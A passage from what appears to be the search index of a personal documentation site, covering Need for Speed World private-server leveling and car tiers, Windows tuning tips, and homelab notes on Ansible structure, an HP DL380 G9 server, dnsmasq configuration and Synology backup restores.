<li>Levelskipped from Level 28 to Level 65: Using the Bolide for 28 minutes during a 2x weekend (with the +50% boost), 326,571 REP and 774,225 cash.  </li> <li>Levelskipped from Level 65 to Level 68: Using La Voiture Noire for 28 minutes during a 2x weekend (with the +50% boost), 726,382 REP and 1,528,078 cash.</li> </ul> <p>So with three Lemans races over 1.5h it is possible to go from Level 1 to Level 68. Compare that to normal gameplay where one can reach around Level 42-49 after 100-300 events (6-10h of gameplay) over a much longer timeframe (examples from a couple friends).</p>"},{"location":"content/games/nfs-world-nrz/#most-efficient-event-for-over-level-60","title":"Most efficient event for over level 60","text":"<p>City Perimeter is the highest-paying events after Lemans efficieny drops off after Level 60. Its high efficiency is due to the track's design, which allows for maintaining high average speeds. Example City Perimeter payouts at level 95 with S2 Class car:</p> <ul> <li>Average REP: ~53,500 per minute</li> <li>Average Cash: ~109,000 per minute</li> </ul>"},{"location":"content/games/nfs-world-nrz/#most-efficient-event-for-all-levels","title":"Most efficient event for all levels","text":"<p>Doing the longest E class restricted race on the current rotation (check here for all rotations) is the best due to the low class restricted reward bonus.</p>"},{"location":"content/games/nfs-world-nrz/#most-fun-event-for-leveling","title":"Most fun event for leveling","text":"<p>Another good choice is High Stakes, but because it's a Team Escape, the rewards vary depending on how many police cars you ram or destroy during the event. Example High Stakes payouts at level 95 with S2 Class car:</p> <ul> <li>Average REP: ~41,600\u201370,240 per minute</li> <li>Average Cash: ~41,600\u201370,240 per minute</li> </ul> <p>Team Escapes in general are quite good and offer better variety and fun for grinding. Underground is another good Team Escape for leveling. Coast Chase is also a good candidate, since it offers more cops to destroy per distance travelled, but is quite a bit longer and harder.</p>"},{"location":"content/games/nfs-world-nrz/#driving-techniques","title":"Driving Techniques","text":"<p>Mastering advanced driving techniques can give you an edge in races/challenges and improve your consistency.</p>"},{"location":"content/games/nfs-world-nrz/#perfect-start","title":"Perfect Start","text":"<p>Perfect Start isn't a technique per se, but still a crucial part in all races. It is a shot of Nitrous available at the start of a race. In order to activate it, players must rev the engine and position the RPM inside the green zone on the RPM indicator on the bottom right-hand side of the screen. Racing without the maximum perfect start duration Skill Mod will handicap you.</p> <p>Achieving a perfect start provides slightly better rewards and will give you a massive early advantage in races.</p> <p>A perfect start is not a power-up and is unaffected by other nitrous Skill Mods.</p>"},{"location":"content/games/nfs-world-nrz/#removing-props","title":"Removing props","text":"<p>There are numerous props scattered throughout the game world, such as road signs, bushes, posts, flower pots, and bus stations, which add detail to the environment. However, colliding with almost any of these props will slow you down, even if the effect is subtle.</p> <p>To minimize the impact of props, configuring your graphics settings correctly is, funnily enough, not straightforward. Avoid using the preset option presets \"Minimum,\" \"High,\" or \"Ultra.\" Instead, opt for \"Low\" or \"Medium\" settings, as these remove the largest number of props from the game. While it might seem logical to assume that the \"World Details\" setting alone controls the number of props, this is not entirely accurate. Using a custom settings preset can inadvertently reintroduce props into the game: for the best results, stick to the recommended \"Low\" or \"Medium\" presets.</p>"},{"location":"content/games/nfs-world-nrz/#breakturning","title":"Breakturning","text":"<p>Unlike in other racing games, in a lot of scenarios it makes sense to turn while breaking in order to make the turn radius tighter.</p>"},{"location":"content/games/nfs-world-nrz/#wall-bouncewall-tap","title":"Wall Bounce/Wall Tap","text":"<p>This technique involves lightly hitting a wall before a corner to strategically lose grip and tighten your turning radius. While effective in some situations, it is inconsistent and requires precision to execute properly.</p>"},{"location":"content/games/nfs-world-nrz/#wallriding","title":"Wallriding","text":"<p>Wallriding is generally not worth using as a primary tactic. However, in certain scenarios, it may the best viable strategy. In some other scenarious it can help with consistency, as there is nothing more consistent than just letting the wall do all the work :P</p>"},{"location":"content/games/nfs-world-nrz/#drag-multiboosting","title":"Drag multiboosting","text":"<p>In drag races, hitting a perfect upshift gives you a small nitrous boost. On higher gears, you can exploit this by upshifting for the boost, then immediately downshifting and upshifting again to trigger another boost on the same gear. How many times you can repeat this \"multi-boost\" depends on the car and its gear ratios. For example, you might upshift into 5th for a boost, downshift to 4th, then upshift to 5th again for another boost, then upshift to 6th for a third boost, downshift to 5th, and upshift to 6th again for yet another boost\u2014creating a ladder effect. With certain cars and drag skills, it's even possible to get three boosts on a single gear if the gear setup allows. Experiment with your car\u2019s gearing and timing to maximize the number of boosts per drag run.</p>"},{"location":"content/games/nfs-world-nrz/#timebug","title":"Timebug","text":"<p>The \"timebug\" is a phenomenon in Need for Speed World where, due to a bug in the game's engine, the game client begins to run slightly faster over long play sessions. This effect accumulates gradually, and after about two hours of having the game open the change is imperceptible, but can result in improved race times - typically by 0.1 to 0.2 seconds - if you are consistent.</p> <p>Some servers attempt to mitigate the impact of the timebug by enforcing a forced game restart after a set period (like NRZ which does it after 4 hours). This resets the game's internal timing and prevents the bug from giving players an unintended advantage.</p>"},{"location":"content/games/nfs-world-nrz/#hood-cam","title":"Hood cam","text":"<p>Using the hood camera, if you can stomach it, will make you more precise due to better visibility.</p>"},{"location":"content/games/nfs-world-nrz/#special-events","title":"Special Events","text":"<p>On weekends there are special events alternating with 2x XP/Cash on one week and increased HRZ performance part drop rate (8% drop rate) on the next week.</p> <p>A random event on rotation is boosted every 30 minutes, boosted are also 2x and they do stack with the weekend event.</p>"},{"location":"content/games/nfs-world-nrz/#vinyls","title":"Vinyls","text":"<p>For managing vinyls, you can use the Vinyl Manager in order to save your designs to <code>.svs</code> files and import other <code>.svs</code> files. <code>.svs</code> files are the best method of archiving designs or transferring designes between servers. Access Vinyl Manager through the following link: Vinyl Manager - Google Drive</p>"},{"location":"content/games/nfs-world-nrz/#best-cars","title":"Best Cars","text":"<p>The following is a breakdown of the best cars in each class in my biased opinion. Note that I tend to prefer technical cars and races and I am not an incredible driver (I tend to complete any challenge that NFSWFR rates equal or lower than 9). Each car's specialty, recommended performance parts, difficulty, and additional notes are listed where available.</p>"},{"location":"content/games/nfs-world-nrz/#for-fun","title":"For Fun","text":"Class Car Fun A, S1 Ford Mustang RTR-X Gains grip as fast as it loses it, flips often. Very fun with full HRZ or blue setups. A, S1, S2 BMW M1 Procar (1979) Very good handling paired with slight oversteery madness on full blue setup. A, S1, S2 Ariel Atom 500 V8 Lightest car in the game so full red setup is infinite grip. E Rovax Edge LW Gocart fun! Try wallriding ;) A Rovax Edge DF Gocart fun but way faster!"},{"location":"content/games/nfs-world-nrz/#races","title":"Races","text":"Class Car Speciality Recommended Perf Parts Difficulty Notes E Ford Cortina E Mercury Cougar Speed/Mixed Red/Green/Blue Hard Literally handles like a boat, has massive inertia, but is very competitive if you can handle it E DeLorean DMC-12 Speed Blue/Green Medium E, D Fiat Punto Mixed Green/Blue Easy E, D Pontiac GTO '65 E, D, C Bugatti Type 57 Tech Blue Medium-hard Grip god, but has exponential turning / input delay. E, D, C Pontiac Firebird Mixed Blue/Green Easy Wants to be handled with care, can slide if too aggressive, but if managed properly is one of the best cars E, D, C Toyota AE86 Tech/Mixed Blue Easy-medium Takes a bit to get going, but is wonderful to handle and if you manage to keep the speed up is very competitive E, D, C, B Peugeot 106 GTi Mixed Blue E, D, C, B Hyundai Tiburon GT Mixed Blue D Nissan 240SX Mixed Blue Easy As simple as they come, very forgiving and stable D Lexus IS300 D Mazda Mazda3 D Chevrolet Corvette Stingray D Volkswagen Golf R32 Speed/Mixed Blue/Green Easy D Mazda MX-5 ND Tech Blue/Green Super easy Like Eclipse Elite but worse speed/acceleration and better grip D, C Ford Cortina D, C Mitsubishi Eclipse Elite Mixed Blue Super easy Cheat code on wheels, easiest car in game D, C, B, A Lancia Delta Mixed Blue C Ford Escort MK1 RS1600 FIA Group 2 Tech/Mixed Green/Blue Easy-medium Grip god C BMW i8 B Porsche 914-6 Tech Blue/Yellow Easy Go cart basically B BMW 135i B Porsche Cayman B Chevrolet Camaro SS B Jaguar E-Type B Lotus Exige Cup Tech/Mixed Blue/Green Super easy B Lotus Europa S B Renault Clio B Lamborghini Miura SV Speed/Mixed Blue/Red Medium B Maserati Gran Turismo B Toyota Supra A Lotus 3 Eleven A Lotus Emira A Lexus ISF A Ford Capri A BMW 1 Series M A Mazda RX-8 B, A Audi TTRS B, A Toyota MR2 Mixed Blue/Yellow Medium-hard Fast and nimble, but bumps/slides easily A Porsche 911 Carrera S A Audi A1 Clubsport A Jeep Wrangler A Porsche 997 GT2 A Nissan Nismo A, S1 Nissan Silvia R3 Tech HRZ Easy-medium A grip god, but lose traction, and you're toast. Watch out for jumps and bumps! Downshift bug happens on perfect start, slight ADAD spam and removing lowering kit can alleviate that S1 BMW 3.0 CSL S1 Jaguar XJ220 S1 Lotus 3 Eleven S1 Nissan Skyline GTR LM S1 Lexus LFA S1 Mazda Furai Tech Blue Easy Nimble and fun S1 Mitsubishi Lancer Evo IX Mixed HRZ Easy-medium Fast but can slip if you steer too aggressively S1 Pagani Zonda F S1 Porsche Taycan S1 Dodge Viper SRT10 S1 Ford Dark Horse S1, S2 Dodge Viper SRT-10 ACR Mixed Blue/HRZ Easy-medium A bit unstable, but super fast S1, S2 Pagani Zonda Cinque Mixed/Speed Any Medium Understeery as all hell, but OP if handled well S2 Hennessey Venom GT Mixed Blue/Red Hard Speed demon, but keeping it on the gripped is a challenge - controller recommended! S2 Mazda 787B Tech Blue/HRZ Medium-hard Grip god, but has exponential turning / input delay. S2 Mercedes-Benz CLK LM S2 Lamborghini Veneno S2 Bugatti Chiron S2 Audi R8 V10 S2 Lancia LC2 Tech Blue/HRZ Medium-hard Grip god, but has exponential turning / input delay. S2 McLaren F1 X Koenigsegg One:1 Speed Red Easy speed/Medium other Best for ez City Perimeter X Ferrari FXX-K Mixed Blue/Red/HRZ Easy The jack-of-all-trades - good at everything, master of none. X Hennessey F5 Mixed Stock only Hard A wild slidy ride - speed management is everything. Best with a controller. X Bugatti La Voiture Noire Speed/Mixed Blue/Red Easy-medium Essentially a better Bolide, due to being able to add performance parts according to your needs. X Koenigsegg Jesko Speed Stock only X Bugatti Bolide Mixed Stock only Easy-medium X Chevrolet Camaro ZL1 Drag Stock only Easy Drag/Ultra hard other Will flip, funniest shit you'll see. Best drag car in game, no competition."},{"location":"content/games/nfs-world-nrz/#pursuits-and-team-escapes","title":"Pursuits and Team Escapes","text":"Class Car Specialty Notes E, D, C, B NFS World Speed Rabbit Tank A tank-like car, great for absorbing damage E, D, C, B NFS World BFH SUV Tank Another tank option, excellent for ramming and durability E, D, C, B Ford Raptor Tank Heavyweight vehicle, great for taking on cops and SUVs B, A, S1 Polestar 1 Balanced Best balance, has surprising amount of weight, can push cops around and handle SUVs head-on B, A, S1, S2 Lamborghini Urus Balanced Decent option, but has less weight than expected A, S1 Nissan Nismo R34 GT-R Z-tune Balanced Very nimble and has good weight A, S1, S2 Audi R8 V10 Performance Coupe Balanced Slightly worse than Polestar, but still a solid choice A, S1, S2 Dodge Viper SRT10 ACR Speed/Balanced More focused on speed but still has good weight for pursuits S2, X Koenigsegg Gemera Speed/Tank Super fast, bad handling, but lots of weight S2, X Koenigsegg One:1 Speed X Hennessey Venom F5 Speed X Bugatti Bolide Speed only Best for speedrunning 60-second escapes, but is stopped easily on collisions"},{"location":"content/games/pc-optimizations/","title":"PC Optimizations","text":"<ul> <li>Win11Debloat by Raphire \u2013 for quick and convenient Windows 11 setup.</li> <li>If using an AMD CPU, adjust PBO (Precision Boost Overdrive) settings in BIOS to undervolt.</li> <li>Disable Game Mode in Windows.</li> <li>Turn off Xbox Game Bar, if CPU has multiple CCDs.</li> <li>(Optional) In BIOS, disable SVM (Secure Virtual Machine), Memory Integrity</li> <li>In BIOS, disable HAGS (Hardware-Accelerated GPU Scheduling).</li> <li>Set <code>Win32PrioritySeparation</code> to <code>0x24</code> (DEC 36) for improved process priority handling.</li> <li>In Process Lasso:</li> <li>Exclude core 0 from CPU affinity for games.</li> <li>Set a rule to disable dynamic thread priority boost for games.</li> </ul>"},{"location":"content/homelab/","title":"HomeLab","text":"<p>Anything directly related to the homelab infrastructure is documented in this section.</p> <p>Info</p> <p>A homelab is self-hosted infrastructure at home for:</p> <ul> <li>experimenting in a safe environment and learning technologies.</li> <li>running personal \"production\" services (like game servers, file cloud etc).</li> </ul>"},{"location":"content/homelab/#hardware","title":"Hardware","text":"<p>Latest full list of hardware used in the JamLab homelab is available on my personal site's Setup page. Other sections in documentation may only reference bits and pieces of the setup.</p>"},{"location":"content/homelab/#pictures","title":"Pictures","text":""},{"location":"content/homelab/#rack-outer","title":"Rack - Outer","text":""},{"location":"content/homelab/#rack-front","title":"Rack - Front","text":""},{"location":"content/homelab/#rack-back","title":"Rack - Back","text":""},{"location":"content/homelab/#attic","title":"Attic","text":""},{"location":"content/homelab/ansible/","title":"Ansible","text":"<p>Info</p> <p>Ansible Homepage | Ansible Documentation | jamlab-ansible | Jeff Geerling's Ansible Guide | Fast Ansible Guide</p> <p>Ansible is a software tool that provides simple but powerful automation for cross-platform computer support. It is primarily intended for IT professionals, who use it for application deployment, updates on workstations and servers, cloud provisioning, configuration management, intra-service orchestration, and nearly anything a systems administrator does on a weekly or daily basis. Ansible doesn't depend on agent software and has no additional security infrastructure, so it's easy to deploy.</p> <p>For the best guide for deep diving into using Ansible check out Jeff Geerling's Ansible Guide if you like video format or Fast Ansible Guide if you prefer text.</p> <p>For configuration management it made sense to go with something simple to ease bootstrapping and favoring mutability for fastest development. Running a whole platform like Puppet did not make sense because of bootstrapping and resource overhead. Ansible is simple to write, understand and manage if written well from the get-go. I also tried SaltStack, but in the end it had too many shortcomings, check out the conclusions of the Ansible User's Guide to Saltstack page.</p> <p>Also knowing Ansible I knew how slow it can be. There's two ways of solving this: using push mode with a central management (with homebrew solutions or AWX/Ansible Tower) with parallel playbook execution for each host OR pull mode where each host essentially configures itself. Running AWX/Ansible Tower has the same problem of bootstrapping and resource overhead. Homebrew parallel push system spikes the central management resource usage when executed and requires you to be on two hosts (central management host and the host being configured) when developing. It is quite evident that pull mode is the more scalable, resource efficient and easier for swift changes, although because of it's outside-in nature it is less secure. I've tried and used both, but went back to push mode using ansible-parallel.</p> <p>I settled on the following requirements:</p> <ul> <li>Easy to bootstrap (i.e. couple of commands excluding secrets)</li> <li>Scalable (execution time does not depend on the number of hosts)</li> <li>Simple to modify and manage (DRY monorepo for all hosts)</li> <li>No single point of failure in the form of a centralized configuration bastion</li> </ul> <p>The solution was jamlab-ansible: Homelab push-mode configuration management with Ansible.</p>"},{"location":"content/homelab/ansible/#ansible-best-practices","title":"Ansible Best Practices","text":""},{"location":"content/homelab/ansible/#idempotency","title":"Idempotency","text":"<p>The most important thing about using Ansible is that all tasks should be idempotent. It means that each time any task is run, the result of it should be the same regardless of any state on the machine it is run on. For example if you want to install some package on a host with ansible and use the ansible.builtin.shell module for it with some command. Maybe it will succeed the first time but give an error when the package is already installed.</p> <p>Instead of ansible.builtin.shell module we should use purpose built Ansible modules if they exist since they will make sure that the result is idempotent. However you can make shell tasks idempotent as well with some workarounds. For example consider the following very common trick of registering outputs from tasks:</p> YAML<pre><code># First we check if a directory for CNI exists.\n- name: Check if cni exists\nansible.builtin.stat:\n    path: /opt/cni/bin/bridge\nregister: r_cni # Then we register the output of this task in a variable called \"r_cni\" (using r_ prefix is an old convention)\n\n# Check if newer CNI exists IF the directory in the last task did exist, check \"when\" key at the bottom of this task\n- name: Check if newer cni exists \nansible.builtin.shell: |\n    latest_tag=$(curl -s https://api.github.com/repos/containernetworking/plugins/releases/latest | jq -r \".tag_name\")\n    current_ver=$(/opt/cni/bin/bridge 2&gt;&amp;1 | cut -d \" \" -f 4)\n    case \"$current_ver\" in ${latest_tag} ) echo \"latest\";; *) echo \"outdated\";; esac\nregister: r_cni_ver # We register the output of our commands which in this case is either \"lastest\" or \"outdated\" we will use this for handling the cases in the next task\nwhen: r_cni.stat.exists # We only run this task if the output of the last task says that the directory did exist\n\n# Get the latest CNI if the output of the last task was not \"latest\", check \"when\" key at the bottom of this task\n- name: Get latest cni\nansible.builtin.shell: |\n    latest_tag=$(curl -s https://api.github.com/repos/containernetworking/plugins/releases/latest | jq -r \".tag_name\")\n    latest_url=https://github.com/containernetworking/plugins/releases/download/${latest_tag}/cni-plugins-linux-amd64-${latest_tag}.tgz\n    wget -P /tmp $latest_url\n    mkdir -p /opt/cni/bin\n    tar -C /opt/cni/bin -xzf /tmp/\"${latest_url##*/}\"\n    rm /tmp/\"${latest_url##*/}\"\nwhen: not r_cni.stat.exists or r_cni_ver.stdout != \"latest\" # We run this task if CNI directory does not exist or when the output of the last task was not \"latest\"\n</code></pre>"},{"location":"content/homelab/ansible/#readability","title":"Readability","text":"<p>The second most important thing about using Ansible is always being explicit. For example when using modules, it is better to write \"ansible.builtin.shell\" instead of \"shell\". That is because external modules and community modules can also be used, but it should be obvious which module is used.</p> <p>Also it should be immediately obvious where variables come from and what is the variable override precedence. This why it is not native behavior in Ansible to combine dicts and lists from different \"variables\" or \"defaults\" files. Instead the variables will follow a precedence and overwrite the one before it. Usually this follows the pattern of (weakest to strongest precedence): global variables, group variables, host variables. So a list from global variables will be overwritten if a list with same name exists in host variables for example.</p>"},{"location":"content/homelab/ansible/#jamlab-ansible-architecture","title":"Jamlab Ansible Architecture","text":"<p>And as per Ansible's own best practices: complexity kills productivity. And I think that a typical ansible monorepo is a bit too complex and usually it is not immediately obvious what goes where.</p> <p>A typical ansible management repository loops something like the examples from the old best practices doc of Ansible:</p> Bash<pre><code>production                # inventory file for production servers\nstaging                   # inventory file for staging environment\n\ngroup_vars/\n   group1                 # here we assign variables to particular groups\n   group2                 # \"\"\nhost_vars/\n   hostname1              # if systems need specific variables, put them here\n   hostname2              # \"\"\n\nlibrary/                  # if any custom modules, put them here (optional)\nmodule_utils/             # if any custom module_utils to support modules, put them here (optional)\nfilter_plugins/           # if any custom filter plugins, put them here (optional)\n\nsite.yml                  # master playbook\nwebservers.yml            # playbook for webserver tier\ndbservers.yml             # playbook for dbserver tier\n\nroles/\n    common/               # this hierarchy represents a \"role\"\n        tasks/            #\n            main.yml      #  &lt;-- tasks file can include smaller files if warranted\n        handlers/         #\n            main.yml      #  &lt;-- handlers file\n        templates/        #  &lt;-- files for use with the template resource\n            ntp.conf.j2   #  &lt;------- templates end in .j2\n        files/            #\n            bar.txt       #  &lt;-- files for use with the copy resource\n            foo.sh        #  &lt;-- script files for use with the script resource\n        vars/             #\n            main.yml      #  &lt;-- variables associated with this role\n        defaults/         #\n            main.yml      #  &lt;-- default lower priority variables for this role\n        meta/             #\n            main.yml      #  &lt;-- role dependencies\n        library/          # roles can also include custom modules\n        module_utils/     # roles can also include custom module_utils\n        lookup_plugins/   # or other types of plugins, like lookup in this case\n\n    webtier/              # same kind of structure as \"common\" was above, done for the webtier role\n    monitoring/           # \"\"\n    fooapp/               # \"\"\n</code></pre> <p>In this structure, each root playbook including the master playbook (<code>site.yml</code> in this case) is defined in the project root directory and imports roles from <code>roles/</code>, variables from <code>group_vars/</code> and <code>host_vars/</code>. Then the master playbook runs all the other playbooks that define which roles are run on which hosts or host groups. This introduces a problem where a breaking change in one role will halt the whole run. Also, even with well organized root playbooks, it is never immediately obvious which roles are defined for which root playbooks especially if using hosts in multiple groups or child/parent groups. Furthermore, the root playbooks, <code>group_vars/</code> and <code>host_vars/</code> are in separate directories which is not a huge deal, but this does require one to verify that root playbooks, variables and roles match when planning changes. This requires extra time of getting familiar with what-goes-where especially when doing changes after a long time. For larger projects usually the roles are managed in and imported from separate repositories. It is a great approach, especially for running tests on the roles. However this increases the time of understanding what-goes-where.</p> <p>These are small nitpicks and for most use cases following the standard structure works well, but for maximum simplicity I grew very fond of a system for pull mode Ansible we used at CERN. An example structure for this system looks something like this:</p> Bash<pre><code>ansible.cfg                 # ansible configuration file\nhosts                       # inventory file\n\nbin/                        # binaries\n    bootstrap.sh            # script for setting up host for the first time\n    run-playbooks.sh        # script for running relevant playbooks locally on host\n\nplaybooks/                  # \"root\" playbook directory\n    group_base/             # \"\"\n        main.yml            # here we define roles for a particular group\n        group_vars/         # \"\"\n            all.yml         # here we assign variables to a particular group\n        host_vars/          # \"\"\n            &lt;hostname&gt;.yml  # here we assign variables to a particular host\n    host_&lt;hostname&gt;/        # here we define roles for a particular host\n        main.yml            # define roles for a particular host\n        host_vars/          # \"\"\n            &lt;hostname&gt;.yml  # here we assign variables to a particular host\n    function_test/          # \"\"\n        main.yml            # \"\"\n\nroles/                      # roles directory\n    &lt;role&gt;/                 # role name \n        defaults/           # \"\"\n            main.yml        # &lt;-- default lower priority variables for this role\n        files/              # \"\"\n            file.txt        # &lt;-- files\n            template.txt.j2 # &lt;-- files for use with the template resource\n        tasks/              # \"\"\n            main.yml        # &lt;-- tasks to run for the role\n</code></pre> <p>With this system root playbooks are separated into directories with their own variables and are not run from a single master playbook thus each play can run regardless of whether there are errors in other playbooks. Each playbook only defines which roles to run on the host group and nothing else, for example:</p> YAML<pre><code>- name: PLAYBOOK FOR GROUP 'GGG'\n  hosts: ggg\n\n  roles:\n\n  - { role: pre, tags: [ pre ], when: not (disabled_roles.pre | default(false)) }\n\n  - { role: rrr, tags: [ rrr ], when: not (disabled_roles.rrr | default(false)) }\n\n  - { role: post, tags: [ post ], when: not (disabled_roles.post | default(false)) }\n</code></pre> <p>This and it's accompanying variables file make it simple to understand at a glance which roles are run and where the group variables are defined since they are all together in one directory.</p> <p>For maximum simplicity for managing the playbooks and roles it should be enforced that each host is only part of ONE group. This will ensure that it will always be immediately obvious which playbooks are run for what host when looking at the inventory file.</p>"},{"location":"content/homelab/dl380g9/","title":"Configuring HP DL380 G9","text":"<p>Done</p> <p>Decomissioned in 10.09.2025, after ~4 years at CERN and ~3 years in the homelab. Farewell you reliable clanker friend!</p> <p>Info</p> <p>DL380 G9 User Manual</p>"},{"location":"content/homelab/dl380g9/#disks-cpus-and-ram","title":"Disks, CPUs and RAM","text":"<p>I was able to obtain a single HP DL380 G9 with a truckload of spare RAM, disks and CPUs. More precisely, the whole array of parts to choose from consisted of 55x 600gb 10K SAS disks, 42x 16GB dual rank ECC DDR4 2133CL15 RAM sticks and 18x Intel Xeon E5-2630 v3 CPUs.</p> <p>For CPUs and disks it was quite easy: slot in as much as the board could fit. Which in my case amounted to 2 CPUs and then 8 disks since I only had one of the three possible drive bays installed on the board.</p> <p>For RAM, however nice it sounded to fill all 24 slots and enjoy 384GB of memory, there was some additional consideration since these CPUs each have four independent memory channels. For best performance, all four memory channels of each CPU should be populated with identical DIMM setup to allow parallel access across the entire memory bus. This means installing 8, 16, or 24 DIMMs total. However populating all three sockets per memory channel, i.e. all 24 slots, memory controller significantly lowers the frequency as detailed in NUMA Deep Dive Part 4: Local Memory Optimization.</p> <p>As more ranks are used in a memory channel, memory speed is dropped to make up for the management overhead. Therefore in certain configurations, DIMMs will run slower than their listed maximum speeds. This is also documented in DL380 G9 User Manual:</p> <p></p> <p>Using 24x16GB would drop the memory speed from 2133MHz to 1600MHz, a quite significant drop. Assuming that I wanted to run some game servers on this server I went with lower capacity, 16x16GB, and thus with higher speed thinking that 8 cores split over 8 VMs would give each VM 1 core (if not over-committing as should be done) and 32GB (realistically 31GB to leave room for hypervisor) of memory which would be sufficient. I left the third slots of the channels empty as per the user manual:</p> <p></p>"},{"location":"content/homelab/dl380g9/#booting-and-bios-settings","title":"Booting and BIOS settings","text":"<p>First order of business was to boot and replace any faulty RAM sticks, which I found 1 of. Having fixed that I made sure that virtualization was enabled and power saving or throttling settings were disabled. Also made sure to reset the ILO management details of the previous owner so I could access it with the default credentials and set my own.</p> <p>I then made my way over to the HP Smart Storage Administrator where I configured the 8x600GB physical disks into 1 logical volume with RAID10. This gave me the ability to hot-swap out any faulty disks on the go. Because of the limiting size of the disks I decided to forgo unconfigured disks standby for disaster recovery hoping that multiple disks would not fault at quick succession.</p>"},{"location":"content/homelab/dl380g9/#os","title":"OS","text":"<p>Info</p> <p>Debian Homepage | Debian Wiki | Debian CD/DVD images | Debian Official Cloud Images | Proxmox Homepage | Proxmox VE Downloads</p> <p>For the OS I decided to go with the tried and true homelab hypervisor Proxmox Virtual Environment as it is basically the only option when it comes to complete, free and open source Platform-as-a-Service OS choices.</p> <p>One of the advantages with using Proxmox is that it is a Debian based OS which makes it easy to set up a single Ansible configuration management system for Proxmox hosts together with Raspberry Pi hosts which usually run Debian based distros as well.</p>"},{"location":"content/homelab/dl380g9/#steps","title":"Steps","text":"<ol> <li>Download the latest iso from Proxmox VE Downloads.</li> <li>Flash it onto USB and boot the server from it.</li> <li>Follow the prompts to configure the volume, locale and install the OS.</li> </ol> <p>Since I run hardware RAID I went with xfs instead of zfs with software RAID for the filesystem.</p>"},{"location":"content/homelab/dl380g9/#bootstrap-the-lab","title":"Bootstrap the lab","text":"<p>Set static IPs with <code>/etc/network/interfaces</code> and then bootstrap the lab with jamlab-ansible: Homelab bootstrap and pull-mode configuration management with Ansible and bash.</p> <p>Bootstrapping is almost as easy as cloning the repo and running the bootstrap script. Exact steps detailed in the repository README and in the Configuration Management chapter.</p>"},{"location":"content/homelab/dnsmasq/","title":"Dnsmasq","text":"<p>Info</p> <p>How DNS Works | Dnsmasq Homepage</p> <p>Dnsmasq provides network infrastructure for small networks: DNS, DHCP, router advertisement and network boot. It is designed to be lightweight and have a small footprint, suitable for resource constrained routers and firewalls.</p> <p>It's simple configuration and lightweight nature makes it a perfect fit for a homelab DNS from a low-powered device like a Raspberry.</p>"},{"location":"content/homelab/dnsmasq/#usage","title":"Usage","text":""},{"location":"content/homelab/dnsmasq/#configuration-files","title":"Configuration files","text":"<p>Dnsmasq reads all <code>.conf</code> files under <code>/etc/dnsmasq.d/</code>.</p> <p>Some useful options for Dnsmasq configuration files:</p> Text Only<pre><code># Don't poll /etc/resolv.conf for changes\nno-poll\n# Don't read /etc/resolv.conf\nno-resolv\n# Only accept queries from local IPs\nlocal-service\n# Never forward queries for plain names, without dots or domain parts, to upstream nameservers\ndomain-needed\n# Bogus private reverse lookups. All reverse lookups for private IP ranges (ie 192.168.x.x, etc) which are not found in /etc/hosts or the DHCP leases file are answered with \"no such domain\" rather than being forwarded upstream\nbogus-priv\n\n# Specify other DNS servers for queries not handled by internal DNSs\nserver=8.8.8.8\nserver=4.4.4.4\n\n# Queries in these domains are answered from /etc/hosts or DHCP only.\n#local=/jamfox.dev/\n\n# Allows DHCP hosts to have FQDN, provides the domain part for \"expand-hosts\"\n#domain=/jamfox.dev/\n\n# Increase the size of dnsmasq's cache\ncache-size=65536\n\n# DNS records\naddress=/pve0.jamfox.dev/192.168.0.100\n\n# Enable reverse DNS lookups for a netblock\nrev-server=192.168.0.0/24,127.0.0.1#8600\n\n# Enable forward lookup of the 'consul' domain to consul server instances\nserver=/consul/192.168.0.120#8600\n</code></pre>"},{"location":"content/homelab/ds220/","title":"Configuring DS220+","text":"<p>Info</p> <p>DS220+ Hardware Guide</p>"},{"location":"content/homelab/ds220/#ram-and-disks","title":"RAM and Disks","text":"<p>Follow the instructions in the manual to install the RAM and disks.</p>"},{"location":"content/homelab/ds220/#dsm-installation","title":"DSM Installation","text":"<p>Power on and navigate to any of the following addresses:</p> <ul> <li>find.synology.com</li> <li>synologynas:5000</li> <li><code>&lt;NAS IP&gt;</code>:5000</li> </ul>"},{"location":"content/homelab/ds220/#restoring-hyper-backup","title":"Restoring Hyper Backup","text":"<p>According to official docs:</p> <ul> <li>Must have Hyper Backup or Hyper Backup Explorer (the desktop app for it) to open/restore backups. For specific model check DS220 utilities page.</li> <li>Follow the Restore prompts to recover data</li> <li>Done</li> </ul> <p>NOTE!: Some data/settings may not be backed up even if specified and using the full system recovery. Some notes about someone's recovery process:</p> <ul> <li>The restoration of almost 8TB of data took about 2 straight days. I'm not complaining, just mentioning it in case others are concerned about restores taking a long time.</li> <li>I backed up the system config and apps in hyper backup and selected the option during the restore to restore system config settings, but I found that apps/packages other than Moments and the handful of default packages DO NOT get installed/restored as part of the backup. The package data appears to be saved in that if you download and install a package that was present in the backup, all of your package configurations and settings seem to be restored, but packages do not get downloaded and installed automatically. I found this to be a bit annoying.</li> <li>Users and groups were backed up and restored appropriately.</li> <li>Settings such as snapshot replication or Drive versioning were completely not re-implemented, so anyone restoring the full NAS from hyperbackups should make sure to re-enable all of these.</li> <li>Firewall settings were not backed up/restored; none of my rules show up in the restored version, which is quite frustrating to discover.</li> <li>Shared Folder Sync (this is what I use to back up the NAS to another NAS semi-regularly) settings were not restored, so anyone using shared folder sync should make sure to double-check their tasks.</li> <li>Nothing about Docker was backed up; not even after downloading Docker, none of my previously-installed containers/images show in docker (I don't mean the containers aren't installed as I had them; unlike my other apps, it appears as if nothing about docker was backed up as part of hyperbackup).</li> <li>I'm finding random various settings that were not restored to what I had them.</li> </ul>"},{"location":"content/homelab/family/","title":"JamLab Family Guide","text":"<p>This page details information about the JamLab services and connection details.</p>"},{"location":"content/homelab/family/#services","title":"Services","text":"<p>Services are web applications that can be accessed via:</p> <ul> <li>any browser using the links from the table.</li> <li>by using their respective mobile or desktop apps.</li> </ul> URL Description Client drive.jamfox.dev File cloud service (like Google Drive or OneDrive) Android / Apple / Desktop photo.jamfox.dev Photo cloud service (like Google Photos) Android / Apple note.jamfox.dev Note cloud service (like collaborative Google Keep) Android / Apple"},{"location":"content/homelab/family/#access","title":"Access","text":"<p>By default services are accessible from a specific set of countries. Temporary rules can be added for traveling by asking.</p> <p>Log in with details provided and change password.</p>"},{"location":"content/homelab/gmkteck10/","title":"GMKtec NucBox K10","text":"<p>Info</p> <p>GMKtec NucBox K10</p>"},{"location":"content/homelab/gmkteck10/#benchmarks-against-dl-380-g9","title":"Benchmarks against DL 380 G9","text":"<p>Green:</p> <ul> <li>Processor: Intel Core i9-13900HK @ 5.20GHz (14 Cores / 20 Threads)</li> <li>Motherboard: GMKtec (NucBox K10 0.12 BIOS)</li> <li>Chipset: Intel Alder Lake PCH</li> <li>Memory: 2 x 32 GB 